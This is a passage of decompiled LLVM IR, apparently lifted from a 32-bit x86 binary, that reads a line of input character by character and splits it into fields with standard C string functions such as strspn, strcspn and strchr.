  %v4_8063db7 = load i32, i32* %v2_8063d34, align 4
  %v5_8063db7 = add i32 %v4_8063db7, %v0_8063db7
  %v15_8063db7 = icmp eq i32 %v5_8063db7, 0
  store i1 %v15_8063db7, i1* %zf.global-to-local, align 1
  store i32 %v5_8063db7, i32* %eax.global-to-local, align 4
  %v2_8063dba = add i32 %v1_8063db5, -12
  %v3_8063dba = inttoptr i32 %v2_8063dba to i32*
  store i32 %v5_8063db7, i32* %v3_8063dba, align 4
  %v3_8063dbb = load i32, i32* %v2_8063cf3, align 4
  %v5_8063dbb = add i32 %v1_8063db5, -16
  %v6_8063dbb = inttoptr i32 %v5_8063dbb to i32*
  store i32 %v3_8063dbb, i32* %v6_8063dbb, align 4
  %v0_8063dbe = call i32 @realloc()
  store i32 %v0_8063dbe, i32* %eax.global-to-local, align 4
  store i32 %v0_8063dbe, i32* %v2_8063cf3, align 4
  %v4_8063dc9 = load i32, i32* %v2_8063d34, align 4
  %v5_8063dc9 = add i32 %v4_8063dc9, %v0_8063dbe
  %v15_8063dc9 = icmp eq i32 %v5_8063dc9, 0
  store i1 %v15_8063dc9, i1* %zf.global-to-local, align 1
  store i32 %v5_8063dc9, i32* %eax.global-to-local, align 4
  store i32 %v5_8063dc9, i32* %v3_8063d3c, align 4
  br label %dec_label_pc_8063d3f

dec_label_pc_8063dd4:                             ; preds = %dec_label_pc_8063da4, %dec_label_pc_8063e0b
  %v2_8063dd4 = load i32, i32* %arg1, align 4
  store i32 %v2_8063dd4, i32* @edx, align 4
  %v1_8063dd6 = add i32 %v2_8063dd4, 52
  %v2_8063dd6 = inttoptr i32 %v1_8063dd6 to i32*
  %v3_8063dd6 = load i32, i32* %v2_8063dd6, align 4
  %v4_8063dd6 = icmp eq i32 %v3_8063dd6, 0
  store i1 %v4_8063dd6, i1* %zf.global-to-local, align 1
  br i1 %v4_8063dd6, label %dec_label_pc_8063df8, label %dec_label_pc_8063ddc

dec_label_pc_8063ddc:                             ; preds = %dec_label_pc_8063dd4
  %v1_8063ddc = add i32 %v2_8063dd4, 16
  %v2_8063ddc = inttoptr i32 %v1_8063ddc to i32*
  %v3_8063ddc = load i32, i32* %v2_8063ddc, align 4
  store i32 %v3_8063ddc, i32* %eax.global-to-local, align 4
  %v2_8063ddf = add i32 %v2_8063dd4, 24
  %v3_8063ddf = inttoptr i32 %v2_8063ddf to i32*
  %v4_8063ddf = load i32, i32* %v3_8063ddf, align 4
  %v10_8063ddf = icmp ult i32 %v3_8063ddc, %v4_8063ddf
  %v15_8063ddf = icmp eq i32 %v3_8063ddc, %v4_8063ddf
  store i1 %v15_8063ddf, i1* %zf.global-to-local, align 1
  %v1_8063de2 = icmp eq i1 %v10_8063ddf, false
  br i1 %v1_8063de2, label %dec_label_pc_8063ded, label %dec_label_pc_8063de4

dec_label_pc_8063de4:                             ; preds = %dec_label_pc_8063ddc
  %v1_8063de4 = inttoptr i32 %v3_8063ddc to i8*
  %v2_8063de4 = load i8, i8* %v1_8063de4, align 1
  %v3_8063de4 = zext i8 %v2_8063de4 to i32
  store i32 %v3_8063de4, i32* @ecx, align 4
  %v1_8063de7 = add i32 %v3_8063ddc, 1
  %v8_8063de7 = icmp eq i32 %v1_8063de7, 0
  store i1 %v8_8063de7, i1* %zf.global-to-local, align 1
  store i32 %v1_8063de7, i32* %eax.global-to-local, align 4
  store i32 %v1_8063de7, i32* %v2_8063ddc, align 4
  %v0_8063e06.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8063e06

dec_label_pc_8063ded:                             ; preds = %dec_label_pc_8063ddc
  %v0_8063ded = load i32, i32* @esp, align 4
  %v9_8063ded = icmp eq i32 %v0_8063ded, 12
  store i1 %v9_8063ded, i1* %zf.global-to-local, align 1
  %v2_8063df0 = add i32 %v0_8063ded, -16
  %v3_8063df0 = inttoptr i32 %v2_8063df0 to i32*
  store i32 %v2_8063dd4, i32* %v3_8063df0, align 4
  %v3_8063df1 = call i32 @getc_unlocked(i16* %tmp31)
  br label %dec_label_pc_8063e01

dec_label_pc_8063df8:                             ; preds = %dec_label_pc_8063dd4
  %v0_8063df8 = load i32, i32* @esp, align 4
  %v9_8063df8 = icmp eq i32 %v0_8063df8, 12
  store i1 %v9_8063df8, i1* %zf.global-to-local, align 1
  %v2_8063dfb = add i32 %v0_8063df8, -16
  %v3_8063dfb = inttoptr i32 %v2_8063dfb to i32*
  store i32 %v2_8063dd4, i32* %v3_8063dfb, align 4
  %v0_8063dfc = call i32 @__GI_fgetc()
  br label %dec_label_pc_8063e01

dec_label_pc_8063e01:                             ; preds = %dec_label_pc_8063ded, %dec_label_pc_8063df8
  %storemerge = phi i32 [ %v0_8063dfc, %dec_label_pc_8063df8 ], [ %v3_8063df1, %dec_label_pc_8063ded ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %storemerge, i32* @ecx, align 4
  %v0_8063e03 = load i32, i32* @esp, align 4
  %v6_8063e03 = icmp eq i32 %v0_8063e03, -16
  store i1 %v6_8063e03, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8063e06

dec_label_pc_8063e06:                             ; preds = %dec_label_pc_8063de4, %dec_label_pc_8063e01
  %v0_8063e0b = phi i32 [ %v0_8063e06.pre, %dec_label_pc_8063de4 ], [ %storemerge, %dec_label_pc_8063e01 ]
  %v10_8063e06 = icmp eq i32 %v0_8063e0b, -1
  store i1 %v10_8063e06, i1* %zf.global-to-local, align 1
  br i1 %v10_8063e06, label %dec_label_pc_8063e10, label %dec_label_pc_8063e0b

dec_label_pc_8063e0b:                             ; preds = %dec_label_pc_8063e06
  %v9_8063e0b = icmp eq i32 %v0_8063e0b, 10
  store i1 %v9_8063e0b, i1* %zf.global-to-local, align 1
  %v1_8063e0e = icmp eq i1 %v9_8063e0b, false
  br i1 %v1_8063e0e, label %dec_label_pc_8063dd4, label %dec_label_pc_8063e10

dec_label_pc_8063e10:                             ; preds = %dec_label_pc_8063d96, %dec_label_pc_8063e0b, %dec_label_pc_8063e06
  %v0_8063e10 = load i32, i32* @edi, align 4
  %v1_8063e10 = add i32 %v0_8063e10, 1
  %v8_8063e10 = icmp eq i32 %v1_8063e10, 0
  store i1 %v8_8063e10, i1* %zf.global-to-local, align 1
  store i32 %v1_8063e10, i32* @edi, align 4
  br i1 %v8_8063e10, label %dec_label_pc_8063f43.loopexit, label %dec_label_pc_8063e17

dec_label_pc_8063e17:                             ; preds = %dec_label_pc_8063e10
  %v0_8063e17 = load i32, i32* @esp, align 4
  %v1_8063e17 = add i32 %v0_8063e17, 56
  %v2_8063e17 = inttoptr i32 %v1_8063e17 to i32*
  %v3_8063e17 = load i32, i32* %v2_8063e17, align 4
  store i32 %v3_8063e17, i32* %edx.global-to-local, align 4
  %v3_8063e1b = load i32, i32* %v3_8063d3c, align 4
  store i32 %v3_8063e1b, i32* @ebx, align 4
  %v1_8063e1e = and i32 %v3_8063e17, 131072
  %v2_8063e1e = icmp eq i32 %v1_8063e1e, 0
  store i1 %v2_8063e1e, i1* %zf.global-to-local, align 1
  store i32 %v1_8063e1e, i32* %edx.global-to-local, align 4
  %v2_8063e24 = add i32 %v0_8063e17, 16
  %v3_8063e24 = inttoptr i32 %v2_8063e24 to i32*
  store i32 %v1_8063e1e, i32* %v3_8063e24, align 4
  br i1 %v2_8063e1e, label %dec_label_pc_8063e17.dec_label_pc_8063e3d_crit_edge, label %dec_label_pc_8063e2a

dec_label_pc_8063e17.dec_label_pc_8063e3d_crit_edge: ; preds = %dec_label_pc_8063e17
  %v0_8063e3d.pre = load i32, i32* @ebx, align 4
  %v4_8063e3d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063e3d

dec_label_pc_8063e2a:                             ; preds = %dec_label_pc_8063e17
  %v0_8063e2a = load i32, i32* @edi, align 4
  %v1_8063e2a = load i32, i32* @esp, align 4
  %v2_8063e2a = add i32 %v1_8063e2a, -4
  %v3_8063e2a = inttoptr i32 %v2_8063e2a to i32*
  store i32 %v0_8063e2a, i32* %v3_8063e2a, align 4
  %v0_8063e2b = load i32, i32* @edi, align 4
  %v2_8063e2b = add i32 %v1_8063e2a, -8
  %v3_8063e2b = inttoptr i32 %v2_8063e2b to i32*
  store i32 %v0_8063e2b, i32* %v3_8063e2b, align 4
  %v1_8063e2c = add i32 %v1_8063e2a, 60
  %v2_8063e2c = inttoptr i32 %v1_8063e2c to i32*
  %v3_8063e2c = load i32, i32* %v2_8063e2c, align 4
  %v1_8063e30 = add i32 %v3_8063e2c, 1
  %v8_8063e30 = icmp eq i32 %v1_8063e30, 0
  store i1 %v8_8063e30, i1* %zf.global-to-local, align 1
  store i32 %v1_8063e30, i32* %eax.global-to-local, align 4
  %v2_8063e31 = add i32 %v1_8063e2a, -12
  %v3_8063e31 = inttoptr i32 %v2_8063e31 to i32*
  store i32 %v1_8063e30, i32* %v3_8063e31, align 4
  %v0_8063e32 = load i32, i32* @ebx, align 4
  %v2_8063e32 = add i32 %v1_8063e2a, -16
  %v3_8063e32 = inttoptr i32 %v2_8063e32 to i32*
  store i32 %v0_8063e32, i32* %v3_8063e32, align 4
  %v6_8063e33 = call i32 @__GI_strspn(i8* %v5_8063cef, i32 %v2_8063ce0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8063e33, i32* %eax.global-to-local, align 4
  %v0_8063e3b = load i32, i32* @ebx, align 4
  %v2_8063e3b = add i32 %v0_8063e3b, %v6_8063e33
  %v12_8063e3b = icmp eq i32 %v2_8063e3b, 0
  store i1 %v12_8063e3b, i1* %zf.global-to-local, align 1
  store i32 %v2_8063e3b, i32* @ebx, align 4
  br label %dec_label_pc_8063e3d

dec_label_pc_8063e3d:                             ; preds = %dec_label_pc_8063e17.dec_label_pc_8063e3d_crit_edge, %dec_label_pc_8063e2a
  %v4_8063e3d = phi i32 [ %v4_8063e3d.pre, %dec_label_pc_8063e17.dec_label_pc_8063e3d_crit_edge ], [ %v6_8063e33, %dec_label_pc_8063e2a ]
  %v0_8063e3d = phi i32 [ %v0_8063e3d.pre, %dec_label_pc_8063e17.dec_label_pc_8063e3d_crit_edge ], [ %v2_8063e3b, %dec_label_pc_8063e2a ]
  %v1_8063e3d = inttoptr i32 %v0_8063e3d to i8*
  %v2_8063e3d = load i8, i8* %v1_8063e3d, align 1
  %v3_8063e3d = zext i8 %v2_8063e3d to i32
  %v5_8063e3d = and i32 %v4_8063e3d, -256
  %v6_8063e3d = or i32 %v3_8063e3d, %v5_8063e3d
  store i32 %v6_8063e3d, i32* %eax.global-to-local, align 4
  %v4_8063e3f = icmp eq i8 %v2_8063e3d, 0
  store i1 %v4_8063e3f, i1* %zf.global-to-local, align 1
  br i1 %v4_8063e3f, label %dec_label_pc_8063cf3, label %dec_label_pc_8063e47

dec_label_pc_8063e47:                             ; preds = %dec_label_pc_8063e3d
  %v0_8063e47 = load i32, i32* @esp, align 4
  %v1_8063e47 = add i32 %v0_8063e47, 60
  %v2_8063e47 = inttoptr i32 %v1_8063e47 to i32*
  %v3_8063e47 = load i32, i32* %v2_8063e47, align 4
  store i32 %v3_8063e47, i32* %edx.global-to-local, align 4
  %v3_8063e4b = inttoptr i32 %v3_8063e47 to i8*
  %v4_8063e4b = load i8, i8* %v3_8063e4b, align 1
  %v15_8063e4b = icmp eq i8 %v2_8063e3d, %v4_8063e4b
  store i1 %v15_8063e4b, i1* %zf.global-to-local, align 1
  br i1 %v15_8063e4b, label %dec_label_pc_8063cf3, label %dec_label_pc_8063e53

dec_label_pc_8063e53:                             ; preds = %dec_label_pc_8063e47
  %v1_8063e53 = add i32 %v0_8063e47, 52
  %v2_8063e53 = inttoptr i32 %v1_8063e53 to i32*
  %v3_8063e53 = load i32, i32* %v2_8063e53, align 4
  store i32 %v3_8063e53, i32* %edx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  %v3_8063e59 = load i32, i32* %v2_8063cf3, align 4
  store i32 %v3_8063e59, i32* %eax.global-to-local, align 4
  %v2_8063e5c = inttoptr i32 %v3_8063e53 to i32*
  store i32 %v3_8063e59, i32* %v2_8063e5c, align 4
  %v0_8063e5e = load i32, i32* @ecx, align 4
  %v1_8063e5e = load i32, i32* @esp, align 4
  %v2_8063e5e = add i32 %v1_8063e5e, -4
  %v3_8063e5e = inttoptr i32 %v2_8063e5e to i32*
  store i32 %v0_8063e5e, i32* %v3_8063e5e, align 4
  %v1_8063e5f = add i32 %v1_8063e5e, 8
  %v2_8063e5f = inttoptr i32 %v1_8063e5f to i32*
  %v3_8063e5f = load i32, i32* %v2_8063e5f, align 4
  %v5_8063e5f = add i32 %v1_8063e5e, -8
  %v6_8063e5f = inttoptr i32 %v5_8063e5f to i32*
  store i32 %v3_8063e5f, i32* %v6_8063e5f, align 4
  %v1_8063e63 = add i32 %v1_8063e5e, -12
  %v2_8063e63 = inttoptr i32 %v1_8063e63 to i32*
  store i32 0, i32* %v2_8063e63, align 4
  %v0_8063e65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063e65 = add i32 %v1_8063e5e, -16
  %v3_8063e65 = inttoptr i32 %v2_8063e65 to i32*
  store i32 %v0_8063e65, i32* %v3_8063e65, align 4
  %v5_8063e66 = call i32 @__GI_memset(i8* %v5_8063cef, i32 %v2_8063ce0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8063e66, i32* %eax.global-to-local, align 4
  %v0_8063e6b = load i32, i32* @esp, align 4
  %v1_8063e6e = add i32 %v0_8063e6b, 36
  %v2_8063e6e = inttoptr i32 %v1_8063e6e to i32*
  %v3_8063e6e = load i32, i32* %v2_8063e6e, align 4
  store i32 %v3_8063e6e, i32* %eax.global-to-local, align 4
  %v1_8063e72 = add i32 %v0_8063e6b, 76
  %v2_8063e72 = inttoptr i32 %v1_8063e72 to i32*
  %v3_8063e72 = load i32, i32* %v2_8063e72, align 4
  %v1_8063e76 = add i32 %v3_8063e6e, -1
  store i32 %v1_8063e76, i32* %eax.global-to-local, align 4
  %v1_8063e77 = add i32 %v3_8063e72, 1
  %v8_8063e77 = icmp eq i32 %v1_8063e77, 0
  store i1 %v8_8063e77, i1* %zf.global-to-local, align 1
  store i32 %v1_8063e77, i32* @edi, align 4
  %v2_8063e78 = add i32 %v0_8063e6b, 28
  %v3_8063e78 = inttoptr i32 %v2_8063e78 to i32*
  store i32 %v1_8063e76, i32* %v3_8063e78, align 4
  %v0_8063f1735 = load i32, i32* @ebx, align 4
  %v1_8063f1736 = inttoptr i32 %v0_8063f1735 to i8*
  %v2_8063f1737 = load i8, i8* %v1_8063f1736, align 1
  %v3_8063f1738 = zext i8 %v2_8063f1737 to i32
  %v4_8063f1739 = load i32, i32* %eax.global-to-local, align 4
  %v5_8063f1740 = and i32 %v4_8063f1739, -256
  %v6_8063f1741 = or i32 %v5_8063f1740, %v3_8063f1738
  store i32 %v6_8063f1741, i32* %eax.global-to-local, align 4
  %v4_8063f1942 = icmp eq i8 %v2_8063f1737, 0
  store i1 %v4_8063f1942, i1* %zf.global-to-local, align 1
  %v1_8063f2f.pre44 = load i32, i32* @esp, align 4
  br i1 %v4_8063f1942, label %dec_label_pc_8063f2f, label %dec_label_pc_8063f1d

dec_label_pc_8063e81:                             ; preds = %dec_label_pc_8063f25
  %v1_8063e81 = add i32 %v1_8063f2f.pre47, 52
  %v2_8063e81 = inttoptr i32 %v1_8063e81 to i32*
  %v3_8063e81 = load i32, i32* %v2_8063e81, align 4
  store i32 %v3_8063e81, i32* %edx.global-to-local, align 4
  %v2_8063e85 = add i32 %v1_8063f2f.pre47, 12
  %v3_8063e85 = inttoptr i32 %v2_8063e85 to i32*
  %v4_8063e85 = load i32, i32* %v3_8063e85, align 4
  %v15_8063e85 = icmp eq i32 %v0_8063f25, %v4_8063e85
  store i1 %v15_8063e85, i1* %zf.global-to-local, align 1
  %v1_8063e89 = inttoptr i32 %v3_8063e81 to i32*
  %v2_8063e89 = load i32, i32* %v1_8063e89, align 4
  store i32 %v2_8063e89, i32* %eax.global-to-local, align 4
  %v3_8063e8b = mul i32 %v0_8063f25, 4
  %v4_8063e8b = add i32 %v2_8063e89, %v3_8063e8b
  %v5_8063e8b = inttoptr i32 %v4_8063e8b to i32*
  store i32 %v0_8063f1745, i32* %v5_8063e8b, align 4
  %v1_8063e8e = icmp eq i1 %v15_8063e85, false
  %v0_8063e9a.pre = load i32, i32* @esp, align 4
  br i1 %v1_8063e8e, label %dec_label_pc_8063e9a, label %dec_label_pc_8063e90

dec_label_pc_8063e90:                             ; preds = %dec_label_pc_8063e81
  %v1_8063e90 = add i32 %v0_8063e9a.pre, 56
  %v2_8063e90 = inttoptr i32 %v1_8063e90 to i32*
  %v3_8063e90 = load i32, i32* %v2_8063e90, align 4
  %v4_8063e90 = and i32 %v3_8063e90, 262144
  %v5_8063e90 = icmp eq i32 %v4_8063e90, 0
  store i1 %v5_8063e90, i1* %zf.global-to-local, align 1
  %v1_8063e98 = icmp eq i1 %v5_8063e90, false
  br i1 %v1_8063e98, label %dec_label_pc_8063eb4, label %dec_label_pc_8063e9a

dec_label_pc_8063e9a:                             ; preds = %dec_label_pc_8063e81, %dec_label_pc_8063e90
  %v1_8063e9a = add i32 %v0_8063e9a.pre, 60
  %v2_8063e9a = inttoptr i32 %v1_8063e9a to i32*
  %v3_8063e9a = load i32, i32* %v2_8063e9a, align 4
  store i32 %v3_8063e9a, i32* %eax.global-to-local, align 4
  %v1_8063e9e = inttoptr i32 %v3_8063e9a to i8*
  %v2_8063e9e = load i8, i8* %v1_8063e9e, align 1
  %v3_8063e9e = icmp eq i8 %v2_8063e9e, 0
  store i1 %v3_8063e9e, i1* %zf.global-to-local, align 1
  %v0_8063ea1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063ea1 = add i32 %v0_8063e9a.pre, -4
  %v3_8063ea1 = inttoptr i32 %v2_8063ea1 to i32*
  store i32 %v0_8063ea1, i32* %v3_8063ea1, align 4
  %v0_8063ea2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063ea2 = add i32 %v0_8063e9a.pre, -8
  %v3_8063ea2 = inttoptr i32 %v2_8063ea2 to i32*
  store i32 %v0_8063ea2, i32* %v3_8063ea2, align 4
  %v1_8063ea3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063ea3 = load i32, i32* @edi, align 4
  %v3_8063ea3 = select i1 %v3_8063e9e, i32 %v2_8063ea3, i32 %v1_8063ea3
  store i32 %v3_8063ea3, i32* %eax.global-to-local, align 4
  %v2_8063ea6 = add i32 %v0_8063e9a.pre, -12
  %v3_8063ea6 = inttoptr i32 %v2_8063ea6 to i32*
  store i32 %v3_8063ea3, i32* %v3_8063ea6, align 4
  %v0_8063ea7 = load i32, i32* @ebx, align 4
  %v2_8063ea7 = add i32 %v0_8063e9a.pre, -16
  %v3_8063ea7 = inttoptr i32 %v2_8063ea7 to i32*
  store i32 %v0_8063ea7, i32* %v3_8063ea7, align 4
  %v0_8063ea8 = call i32 @strcspn()
  store i32 %v0_8063ea8, i32* %eax.global-to-local, align 4
  %v0_8063ead = load i32, i32* @esp, align 4
  %v1_8063ead = add i32 %v0_8063ead, 16
  %v0_8063eb0 = load i32, i32* @ebx, align 4
  %v2_8063eb0 = add i32 %v0_8063eb0, %v0_8063ea8
  %v12_8063eb0 = icmp eq i32 %v2_8063eb0, 0
  store i1 %v12_8063eb0, i1* %zf.global-to-local, align 1
  store i32 %v2_8063eb0, i32* @ebx, align 4
  br label %dec_label_pc_8063ee7

dec_label_pc_8063eb4:                             ; preds = %dec_label_pc_8063e90
  %v0_8063eb4 = load i32, i32* @ecx, align 4
  %v2_8063eb4 = add i32 %v0_8063e9a.pre, -4
  %v3_8063eb4 = inttoptr i32 %v2_8063eb4 to i32*
  store i32 %v0_8063eb4, i32* %v3_8063eb4, align 4
  %v0_8063eb5 = load i32, i32* @ecx, align 4
  %v2_8063eb5 = add i32 %v0_8063e9a.pre, -8
  %v3_8063eb5 = inttoptr i32 %v2_8063eb5 to i32*
  store i32 %v0_8063eb5, i32* %v3_8063eb5, align 4
  %v1_8063eb6 = add i32 %v0_8063e9a.pre, 60
  %v2_8063eb6 = inttoptr i32 %v1_8063eb6 to i32*
  %v3_8063eb6 = load i32, i32* %v2_8063eb6, align 4
  store i32 %v3_8063eb6, i32* %edx.global-to-local, align 4
  %v1_8063eba = inttoptr i32 %v3_8063eb6 to i8*
  %v2_8063eba = load i8, i8* %v1_8063eba, align 1
  %v3_8063eba = zext i8 %v2_8063eba to i32
  store i32 %v3_8063eba, i32* %eax.global-to-local, align 4
  %v2_8063ebd = add i32 %v0_8063e9a.pre, -12
  %v3_8063ebd = inttoptr i32 %v2_8063ebd to i32*
  store i32 %v3_8063eba, i32* %v3_8063ebd, align 4
  %v0_8063ebe = load i32, i32* @ebx, align 4
  %v2_8063ebe = add i32 %v0_8063e9a.pre, -16
  %v3_8063ebe = inttoptr i32 %v2_8063ebe to i32*
  store i32 %v0_8063ebe, i32* %v3_8063ebe, align 4
  %v0_8063ebf = call i32 @__GI_strchrnul()
  store i32 %v0_8063ebf, i32* %eax.global-to-local, align 4
  %v0_8063ec4 = load i32, i32* @esp, align 4
  %v1_8063ec4 = add i32 %v0_8063ec4, 16
  %v1_8063ec7 = add i32 %v0_8063ec4, 32
  %v2_8063ec7 = inttoptr i32 %v1_8063ec7 to i32*
  %v3_8063ec7 = load i32, i32* %v2_8063ec7, align 4
  %v4_8063ec7 = icmp eq i32 %v3_8063ec7, 0
  store i1 %v4_8063ec7, i1* %zf.global-to-local, align 1
  store i32 %v0_8063ebf, i32* @ebx, align 4
  %v1_8063ece = icmp eq i1 %v4_8063ec7, false
  br i1 %v1_8063ece, label %dec_label_pc_8063ed3, label %dec_label_pc_8063ee7

dec_label_pc_8063ed2:                             ; preds = %dec_label_pc_8063ed3
  %v1_8063ed2 = add i32 %v0_8063ed2, -1
  %v8_8063ed2 = icmp eq i32 %v1_8063ed2, 0
  store i1 %v8_8063ed2, i1* %zf.global-to-local, align 1
  store i32 %v1_8063ed2, i32* @ebx, align 4
  br label %dec_label_pc_8063ed3

dec_label_pc_8063ed3:                             ; preds = %dec_label_pc_8063eb4, %dec_label_pc_8063ed2
  %v1_8063ed3 = phi i32 [ %v1_8063ee0, %dec_label_pc_8063ed2 ], [ %v1_8063ec4, %dec_label_pc_8063eb4 ]
  %v0_8063ed3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063ed3 = add i32 %v1_8063ed3, -4
  %v3_8063ed3 = inttoptr i32 %v2_8063ed3 to i32*
  store i32 %v0_8063ed3, i32* %v3_8063ed3, align 4
  %v0_8063ed4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063ed4 = add i32 %v1_8063ed3, -8
  %v3_8063ed4 = inttoptr i32 %v2_8063ed4 to i32*
  store i32 %v0_8063ed4, i32* %v3_8063ed4, align 4
  %v0_8063ed5 = load i32, i32* @ebx, align 4
  %v1_8063ed5 = add i32 %v0_8063ed5, -1
  %v2_8063ed5 = inttoptr i32 %v1_8063ed5 to i8*
  %v3_8063ed5 = load i8, i8* %v2_8063ed5, align 1
  %v4_8063ed5 = zext i8 %v3_8063ed5 to i32
  store i32 %v4_8063ed5, i32* %eax.global-to-local, align 4
  %v2_8063ed9 = add i32 %v1_8063ed3, -12
  %v3_8063ed9 = inttoptr i32 %v2_8063ed9 to i32*
  store i32 %v4_8063ed5, i32* %v3_8063ed9, align 4
  %v0_8063eda = load i32, i32* @edi, align 4
  %v2_8063eda = add i32 %v1_8063ed3, -16
  %v3_8063eda = inttoptr i32 %v2_8063eda to i32*
  store i32 %v0_8063eda, i32* %v3_8063eda, align 4
  %v4_8063edb = call i32 @__GI_strchr(i8* %v5_8063cef, i32 %v2_8063ce0)
  store i32 %v4_8063edb, i32* %eax.global-to-local, align 4
  %v0_8063ee0 = load i32, i32* @esp, align 4
  %v1_8063ee0 = add i32 %v0_8063ee0, 16
  %v1_8063ee3 = icmp eq i32 %v4_8063edb, 0
  store i1 %v1_8063ee3, i1* %zf.global-to-local, align 1
  %v1_8063ee5 = icmp eq i1 %v1_8063ee3, false
  %v0_8063ed2 = load i32, i32* @ebx, align 4
  br i1 %v1_8063ee5, label %dec_label_pc_8063ed2, label %dec_label_pc_8063ee7

dec_label_pc_8063ee7:                             ; preds = %dec_label_pc_8063ed3, %dec_label_pc_8063eb4, %dec_label_pc_8063e9a
  %v0_8063efa = phi i32 [ %v0_8063ebf, %dec_label_pc_8063eb4 ], [ %v2_8063eb0, %dec_label_pc_8063e9a ], [ %v0_8063ed2, %dec_label_pc_8063ed3 ]
  %v4_8063eeb = phi i32 [ %v0_8063ebf, %dec_label_pc_8063eb4 ], [ %v0_8063ea8, %dec_label_pc_8063e9a ], [ %v4_8063edb, %dec_label_pc_8063ed3 ]
  %v0_8063ee7 = phi i32 [ %v1_8063ec4, %dec_label_pc_8063eb4 ], [ %v1_8063ead, %dec_label_pc_8063e9a ], [ %v1_8063ee0, %dec_label_pc_8063ed3 ]
  %v1_8063ee7 = add i32 %v0_8063ee7, 60
  %v2_8063ee7 = inttoptr i32 %v1_8063ee7 to i32*
  %v3_8063ee7 = load i32, i32* %v2_8063ee7, align 4
  store i32 %v3_8063ee7, i32* @edx, align 4
  %v1_8063eeb = inttoptr i32 %v0_8063efa to i8*
  %v2_8063eeb = load i8, i8* %v1_8063eeb, align 1
  %v3_8063eeb = zext i8 %v2_8063eeb to i32
  %v5_8063eeb = and i32 %v4_8063eeb, -256
  %v6_8063eeb = or i32 %v3_8063eeb, %v5_8063eeb
  store i32 %v6_8063eeb, i32* %eax.global-to-local, align 4
  %v3_8063eed = inttoptr i32 %v3_8063ee7 to i8*
  %v4_8063eed = load i8, i8* %v3_8063eed, align 1
  %v15_8063eed = icmp eq i8 %v2_8063eeb, %v4_8063eed
  store i1 %v15_8063eed, i1* %zf.global-to-local, align 1
  %v1_8063eef = icmp eq i1 %v15_8063eed, false
  br i1 %v1_8063eef, label %dec_label_pc_8063ef6, label %dec_label_pc_8063ef1

dec_label_pc_8063ef1:                             ; preds = %dec_label_pc_8063ee7
  store i8 0, i8* %v1_8063eeb, align 1
  br label %dec_label_pc_8063efe

dec_label_pc_8063ef6:                             ; preds = %dec_label_pc_8063ee7
  %v4_8063ef6 = icmp eq i8 %v2_8063eeb, 0
  store i1 %v4_8063ef6, i1* %zf.global-to-local, align 1
  br i1 %v4_8063ef6, label %dec_label_pc_8063efe, label %dec_label_pc_8063efa

dec_label_pc_8063efa:                             ; preds = %dec_label_pc_8063ef6
  store i8 0, i8* %v1_8063eeb, align 1
  %v0_8063efd = load i32, i32* @ebx, align 4
  %v1_8063efd = add i32 %v0_8063efd, 1
  %v8_8063efd = icmp eq i32 %v1_8063efd, 0
  store i1 %v8_8063efd, i1* %zf.global-to-local, align 1
  store i32 %v1_8063efd, i32* @ebx, align 4
  br label %dec_label_pc_8063efe

dec_label_pc_8063efe:                             ; preds = %dec_label_pc_8063ef6, %dec_label_pc_8063ef1, %dec_label_pc_8063efa
  %v0_8063efe = load i32, i32* @esp, align 4
  %v1_8063efe = add i32 %v0_8063efe, 56
  %v2_8063efe = inttoptr i32 %v1_8063efe to i32*
  %v3_8063efe = load i32, i32* %v2_8063efe, align 4
  %v4_8063efe = and i32 %v3_8063efe, 65536
  %v5_8063efe = icmp eq i32 %v4_8063efe, 0
  store i1 %v5_8063efe, i1* %zf.global-to-local, align 1
  br i1 %v5_8063efe, label %dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge, label %dec_label_pc_8063f08

dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge: ; preds = %dec_label_pc_8063efe
  %v0_8063f17.pre = load i32, i32* @ebx, align 4
  %v4_8063f17.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063f16

dec_label_pc_8063f08:                             ; preds = %dec_label_pc_8063efe
  %v0_8063f08 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063f08 = add i32 %v0_8063efe, -4
  %v3_8063f08 = inttoptr i32 %v2_8063f08 to i32*
  store i32 %v0_8063f08, i32* %v3_8063f08, align 4
  %v0_8063f09 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063f09 = add i32 %v0_8063efe, -8
  %v3_8063f09 = inttoptr i32 %v2_8063f09 to i32*
  store i32 %v0_8063f09, i32* %v3_8063f09, align 4
  %v0_8063f0a = load i32, i32* @edi, align 4
  %v2_8063f0a = add i32 %v0_8063efe, -12
  %v3_8063f0a = inttoptr i32 %v2_8063f0a to i32*
  store i32 %v0_8063f0a, i32* %v3_8063f0a, align 4
  %v0_8063f0b = load i32, i32* @ebx, align 4
  %v2_8063f0b = add i32 %v0_8063efe, -16
  %v3_8063f0b = inttoptr i32 %v2_8063f0b to i32*
  store i32 %v0_8063f0b, i32* %v3_8063f0b, align 4
  %v6_8063f0c = call i32 @__GI_strspn(i8* %v5_8063cef, i32 %v2_8063ce0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8063f0c, i32* %eax.global-to-local, align 4
  %v0_8063f11 = load i32, i32* @esp, align 4
  %v1_8063f11 = add i32 %v0_8063f11, 16
  %v0_8063f14 = load i32, i32* @ebx, align 4
  %v2_8063f14 = add i32 %v0_8063f14, %v6_8063f0c
  %v12_8063f14 = icmp eq i32 %v2_8063f14, 0
  store i1 %v12_8063f14, i1* %zf.global-to-local, align 1
  store i32 %v2_8063f14, i32* @ebx, align 4
  br label %dec_label_pc_8063f16

dec_label_pc_8063f16:                             ; preds = %dec_label_pc_8063efe.dec_label_pc_8063f16_crit_edge, %dec_label_pc_8063f08
